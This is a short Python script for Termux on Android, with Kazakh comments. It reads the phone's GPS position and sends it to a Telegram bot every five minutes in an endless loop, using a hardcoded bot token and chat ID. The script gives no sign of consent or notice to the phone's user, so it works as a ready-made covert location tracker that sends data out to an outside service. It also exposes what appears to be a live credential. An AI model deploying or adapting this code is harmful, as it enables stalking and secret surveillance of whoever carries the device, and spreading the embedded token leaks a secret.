import requests
import time
import subprocess
import json

TOKEN = "8711913443:AAFizqWhgtm9w58i2UD5PnckYiXWkKA1s2M"
CHAT_ID = "7594678193"

def get_location():
    try:
        # GPS-ті оқу
        loc_data = subprocess.check_output(['termux-location']).decode('utf-8')
        loc_json = json.loads(loc_data)
        return loc_json['latitude'], loc_json['longitude']
    except:
        return None, None

def send_to_pro():
    lat, lon = get_location()
    if lat and lon:
        url = f"https://api.telegram.org/bot{TOKEN}/sendLocation"
        payload = {"chat_id": CHAT_ID, "latitude": lat, "longitude": lon}
        requests.post(url, json=payload)

while True:
    send_to_pro()
    time.sleep(300) # 5 минут сайын жіберу

